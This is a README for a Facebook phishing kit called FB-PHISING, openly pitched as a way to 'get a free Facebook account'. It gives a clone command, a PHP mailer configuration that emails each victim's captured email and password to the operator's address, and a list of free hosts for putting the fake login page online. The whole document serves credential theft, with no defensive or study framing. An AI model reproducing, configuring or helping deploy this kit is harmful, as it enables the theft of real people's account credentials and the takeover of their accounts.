# FB-PHISING

Do you want to get a free Facebook account? FB-PHISING is the solution

## Installation

You can install with git bash or directly from github

```bash
git clone https://github.com/SbgSchool/FB-PHISING.git
```

## Usage

Change the configuration belows

```php
$mail->Username = "your@email.com"; //email server
$mail->Password = "your_password"; //password email server
$mail->SetFrom("Your Email", "Name"); //set sender email
$mail->Subject = "subject"; //subject email
$mail->AddAddress("Your@email2.com");  // Email to get results
$mail->MsgHTML("Email : ".$email."\nPass : ".$pass."");
```

After changing the configuration ... you can immediately try it with a web server or web hosting

| Webserver | Webhosting | 
| ----------- | :---------: |
| [Infinity Free](infinityfree.net)| [Xampp](https://www.apachefriends.org/index.html) | 
| [000webhost](https://id.000webhost.com/) | [Wampp](https://www.wampserver.com/en/) | 
| and Others | and Others | 

## Contributing
Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.

Please make sure to update tests as appropriate.

## License
[MIT](https://choosealicense.com/licenses/mit/)
